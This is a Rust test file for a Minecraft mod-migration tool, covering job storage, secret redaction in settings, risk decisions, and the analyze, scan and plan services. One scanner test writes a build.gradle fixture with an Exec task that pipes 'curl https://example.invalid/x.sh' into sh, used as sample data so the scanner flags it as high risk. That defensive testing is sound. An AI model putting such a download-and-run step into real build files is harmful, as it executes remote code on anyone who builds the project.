//! Phase 11.A: application services facade tests.

use tempfile::tempdir;
use ummp_core::jobs::{Job, JobState};
use ummp_core::persistence::JobDb;
use uuid::Uuid;

#[test]
fn job_state_cancelled_round_trips_through_jobdb() {
    let dir = tempdir().unwrap();
    let db = JobDb::open(&dir.path().join("jobs.db")).unwrap();
    let session = Uuid::new_v4();
    let mut job = Job::new(session, "port");
    job.mark_running();
    job.mark_cancelled();
    db.insert(&job).unwrap();

    let jobs = db.by_session(session).unwrap();
    assert_eq!(jobs.len(), 1);
    assert_eq!(jobs[0].state, JobState::Cancelled);
}

// ---- 11.A2 skeleton: settings, secrets, moved helpers ----

use std::path::Path;
use ummp_core::app::helpers::{
    detected_loader, mod_identity, open_kb, pack_format, risk_decision, side, RiskDecision,
};
use ummp_core::app::snapshots::{default_snapshots, load_store, save_store};
use ummp_core::app::{AppError, AppServices, Secret, Settings};
use ummp_core::modpack::plan::Side;
use ummp_core::modpack::PackFormat;
use ummp_core::scan::Severity;

fn fixture(rel: &str) -> std::path::PathBuf {
    Path::new(env!("CARGO_MANIFEST_DIR"))
        .join("../tests/fixtures")
        .join(rel)
}

#[test]
fn secret_prints_stars_in_debug_and_display() {
    let s = Secret::new("sk-ant-very-secret");
    assert_eq!(format!("{s:?}"), "***");
    assert_eq!(format!("{s}"), "***");
    assert_eq!(s.expose(), "sk-ant-very-secret");
}

#[test]
fn settings_json_never_contains_secret() {
    let dir = tempdir().unwrap();
    let svc = AppServices::open(Settings::new(dir.path().to_path_buf())).unwrap();
    let mut s = svc.settings();
    s.language = "vi".into();
    s.sandbox_repo = Some("demo/sandbox".into());
    s.ai_provider = Some("anthropic".into());
    // A key held by the caller never reaches the settings file.
    let key = Secret::new("sk-ant-very-secret");
    svc.save_settings(s).unwrap();

    let text = std::fs::read_to_string(dir.path().join("settings.json")).unwrap();
    assert!(!text.contains(key.expose()), "{text}");
    assert!(!text.to_lowercase().contains("sk-"), "{text}");
    assert!(text.contains("\"language\": \"vi\""), "{text}");

    // A new instance reads the saved values back.
    let again = AppServices::open(Settings::new(dir.path().to_path_buf())).unwrap();
    assert_eq!(again.settings().language, "vi");
    assert_eq!(
        again.settings().sandbox_repo.as_deref(),
        Some("demo/sandbox")
    );
}

#[test]
fn save_settings_rejects_unknown_language() {
    let dir = tempdir().unwrap();
    let svc = AppServices::open(Settings::new(dir.path().to_path_buf())).unwrap();
    let mut s = svc.settings();
    s.language = "xx".into();
    assert!(matches!(svc.save_settings(s), Err(AppError::Input(_))));
}

#[test]
fn open_creates_missing_data_dir() {
    let dir = tempdir().unwrap();
    let data = dir.path().join("a/b/data");
    AppServices::open(Settings::new(data.clone())).unwrap();
    assert!(data.is_dir());
}

#[test]
fn risk_decision_matches_cli_rules() {
    use RiskDecision::*;
    // GitHub builds only warn.
    assert_eq!(
        risk_decision(Some(Severity::High), false, false, false),
        AllowWithWarning
    );
    assert_eq!(risk_decision(None, false, false, false), Allow);
    // Local: High needs the explicit acknowledgment.
    assert!(matches!(
        risk_decision(Some(Severity::High), true, false, false),
        Refuse(_)
    ));
    assert_eq!(
        risk_decision(Some(Severity::High), true, true, false),
        Allow
    );
    // Local: Medium needs yes or accept, otherwise a confirmation.
    assert_eq!(
        risk_decision(Some(Severity::Medium), true, false, false),
        Confirm
    );
    assert_eq!(
        risk_decision(Some(Severity::Medium), true, false, true),
        Allow
    );
    assert_eq!(
        risk_decision(Some(Severity::Medium), true, true, false),
        Allow
    );
    assert_eq!(
        risk_decision(Some(Severity::Low), true, false, false),
        Allow
    );
}

#[test]
fn pack_format_and_side_parse_or_say_why() {
    assert_eq!(pack_format("mrpack").unwrap(), PackFormat::Mrpack);
    assert!(matches!(pack_format("rar"), Err(AppError::Input(m)) if m.contains("rar")));
    assert_eq!(side("both").unwrap(), Side::Both);
    assert!(matches!(side("moon"), Err(AppError::Input(_))));
}

#[test]
fn open_kb_without_inputs_is_in_memory_and_missing_file_is_input_error() {
    open_kb(None, None).unwrap();
    let dir = tempdir().unwrap();
    let missing = dir.path().join("nope.json");
    assert!(open_kb(None, Some(missing)).is_err());
}

#[test]
fn identity_and_loader_come_from_the_descriptor() {
    let fabric = fixture("loader/fabric-src");
    assert_eq!(detected_loader(&fabric).as_deref(), Some("fabric"));
    let (name, _java) = mod_identity(&fabric);
    assert!(!name.is_empty());
    assert!(name
        .chars()
        .all(|c| c.is_ascii_alphanumeric() || c == '-' || c == '_'));
}

#[test]
fn snapshot_helpers_round_trip_and_name_the_folder_next_to_project() {
    let dir = tempdir().unwrap();
    let proj = dir.path().join("DemoWidget");
    assert_eq!(
        default_snapshots(&proj),
        dir.path().join("DemoWidget.ummp-snapshots")
    );
    let snap = default_snapshots(&proj);
    assert!(load_store(&snap).unwrap().checkpoints.is_empty());
    save_store(&snap, &ummp_core::checkpoint::CheckpointStore::new()).unwrap();
    assert!(snap.join("checkpoints.json").is_file());
    assert!(load_store(&snap).unwrap().checkpoints.is_empty());
}

// ---- 11.A3 synchronous services: analyze, scan, targets, plan ----

use std::collections::BTreeMap;
use std::io::Write as _;
use std::path::PathBuf;
use ummp_core::app::views::{FileKind, RiskLevel};
use ummp_core::app::PlanRequest;

fn read_tree(root: &Path) -> BTreeMap<PathBuf, Vec<u8>> {
    ummp_core::checkpoint::collect_files(root)
        .unwrap()
        .into_iter()
        .map(|r| (r.clone(), std::fs::read(root.join(&r)).unwrap()))
        .collect()
}

fn copy_tree(from: &Path, to: &Path) {
    for (rel, data) in read_tree(from) {
        let p = to.join(rel);
        std::fs::create_dir_all(p.parent().unwrap()).unwrap();
        std::fs::write(p, data).unwrap();
    }
}

fn services(dir: &Path) -> AppServices {
    AppServices::open(Settings::new(dir.join("data"))).unwrap()
}

fn plan_req(input: PathBuf) -> PlanRequest {
    PlanRequest {
        input,
        from: Some("1.21.1".into()),
        to: "1.21.1".into(),
        loader: Some("neoforge".into()),
        min_confidence: 0.8,
    }
}

#[test]
fn analyze_reports_mod_loader_and_technologies_for_fabric_src() {
    let d = tempdir().unwrap();
    let a = services(d.path())
        .analyze(&fixture("loader/fabric-src"))
        .unwrap();
    assert_eq!(a.kind, "folder");
    assert!(!a.mods.is_empty(), "{a:?}");
    assert_eq!(a.mods[0].loader, "fabric");
    assert!(!a.mods[0].id.is_empty());
    assert!(!a.technologies.is_empty(), "adapters should find something");
}

#[test]
fn analyze_demo_fabric_mod_smoke() {
    let d = tempdir().unwrap();
    let a = services(d.path())
        .analyze(&fixture("demo-fabric-mod"))
        .unwrap();
    assert!(!a.mods.is_empty());
}

#[test]
fn bad_paths_give_input_errors_not_panics() {
    let d = tempdir().unwrap();
    let svc = services(d.path());
    let missing = d.path().join("nope");
    assert!(
        matches!(svc.analyze(&missing), Err(AppError::Input(m)) if m.contains("does not exist"))
    );
    let file = d.path().join("notes.txt");
    std::fs::write(&file, "x").unwrap();
    assert!(matches!(svc.analyze(&file), Err(AppError::Input(_))));
    let empty = d.path().join("empty");
    std::fs::create_dir(&empty).unwrap();
    assert!(matches!(svc.analyze(&empty), Err(AppError::Input(m)) if m.contains("no mod")));
    assert!(matches!(svc.scan(&missing), Err(AppError::Input(_))));
    assert!(matches!(
        svc.plan(&plan_req(missing)),
        Err(AppError::Input(_))
    ));
}

#[test]
fn scan_clean_source_has_no_level_and_high_fixture_is_high() {
    let d = tempdir().unwrap();
    let svc = services(d.path());
    let clean = svc.scan(&fixture("loader/fabric-src")).unwrap();
    assert_eq!(clean.level, None);
    assert!(clean.findings.is_empty());

    let bad = d.path().join("bad");
    std::fs::create_dir(&bad).unwrap();
    std::fs::write(
        bad.join("build.gradle"),
        "plugins { id 'java' }\ntask setup(type: Exec) {\n  commandLine 'sh', '-c', 'curl https://example.invalid/x.sh | sh'\n}\n",
    )
    .unwrap();
    let high = svc.scan(&bad).unwrap();
    assert_eq!(high.level, Some(RiskLevel::High));
    assert!(high
        .findings
        .iter()
        .any(|f| f.rule == "build-download-exec"));
}

#[test]
fn targets_come_from_the_shipped_templates() {
    let d = tempdir().unwrap();
    let t = services(d.path()).targets();
    for l in ["forge", "fabric", "neoforge", "quilt"] {
        assert!(t.loaders.iter().any(|x| x == l), "{l} missing: {t:?}");
    }
    let v = t.versions.iter().find(|v| v.minecraft == "1.21.1").unwrap();
    assert!(v.loaders.iter().any(|l| l == "neoforge"));
}

/// ★ mutation: make `plan` write into the input (or return no files) and this goes red.
#[test]
fn plan_returns_diffs_and_writes_nothing() {
    let d = tempdir().unwrap();
    let input = d.path().join("in");
    copy_tree(&fixture("loader/fabric-src"), &input);
    let before = read_tree(&input);

    let plan = services(d.path()).plan(&plan_req(input.clone())).unwrap();

    assert_eq!(read_tree(&input), before, "plan must not write");
    assert!(!plan.files.is_empty(), "{plan:?}");
    let created = plan
        .files
        .iter()
        .find(|f| f.path.ends_with("neoforge.mods.toml"))
        .unwrap_or_else(|| panic!("no neoforge descriptor in {:?}", plan.files));
    assert_eq!(created.kind, FileKind::Created);
    assert!(created.diff.contains("+++"), "{}", created.diff);
    assert!(
        plan.deletes.iter().any(|p| p.ends_with("fabric.mod.json")),
        "{:?}",
        plan.deletes
    );
    assert_eq!(plan.target_loader, "neoforge");
    assert_eq!(plan.source_loader.as_deref(), Some("fabric"));
}

#[test]
fn plan_reads_a_zip_and_refuses_a_downgrade() {
    let d = tempdir().unwrap();
    let zip = d.path().join("demo.zip");
    {
        let mut z = zip::ZipWriter::new(std::fs::File::create(&zip).unwrap());
        let o = zip::write::FileOptions::default();
        for (rel, data) in read_tree(&fixture("loader/fabric-src")) {
            z.start_file(rel.to_string_lossy().replace('\\', "/"), o)
                .unwrap();
            z.write_all(&data).unwrap();
        }
        z.finish().unwrap();
    }
    let svc = services(d.path());
    assert!(!svc.plan(&plan_req(zip.clone())).unwrap().files.is_empty());

    let mut down = plan_req(zip);
    down.from = Some("1.21.1".into());
    down.to = "1.16.5".into();
    assert!(matches!(svc.plan(&down), Err(AppError::Migration(_))));
}
